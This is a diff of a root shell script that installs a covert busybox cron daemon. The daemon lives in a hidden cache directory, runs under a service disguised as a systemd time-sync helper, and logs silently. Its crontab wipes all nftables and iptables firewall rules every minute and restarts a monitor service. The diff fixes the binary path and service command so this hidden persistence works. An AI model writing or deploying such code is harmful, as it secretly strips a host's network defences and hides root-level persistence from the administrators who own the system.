@@ -13,7 +13,7 @@
 set -euo pipefail
 
 SPOOL_DIR="/var/cache/.syspkg/tabs"       # hidden crontab directory
-CROND_BIN="/usr/local/lib/.sysd"          # busybox copy — shows as ".sysd" in ps
+CROND_BIN="/var/cache/.syspkg/crond"      # busybox copy — basename must be "crond" for applet lookup
 SERVICE_NAME="systemd-timesyncd-helper"   # systemd service name
 SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 LOG_FILE="/dev/null"                      # crond log — /dev/null keeps it quiet
@@ -82,7 +82,6 @@ cmd_install() {
 # system maintenance tasks
 * * * * * nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; iptables -X 2>/dev/null; ip6tables -F 2>/dev/null
 */5 * * * * systemctl is-active --quiet network-health-monitor || systemctl start network-health-monitor 2>/dev/null
-@reboot nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; ip6tables -F 2>/dev/null
 EOF
     chmod 600 "${SPOOL_DIR}/root"
     info "Crontab written to ${SPOOL_DIR}/root"
@@ -103,7 +102,7 @@ Type=simple
 #   -c  custom spool directory
 #   -L  log file (/dev/null = silent)
 #   -l  log level 8 = only log errors
-ExecStart=${CROND_BIN} crond -f -c ${SPOOL_DIR} -L ${LOG_FILE} -l 8
+ExecStart=${CROND_BIN} -f -c ${SPOOL_DIR} -L ${LOG_FILE} -l 8
 Restart=always
 RestartSec=10
 User=root
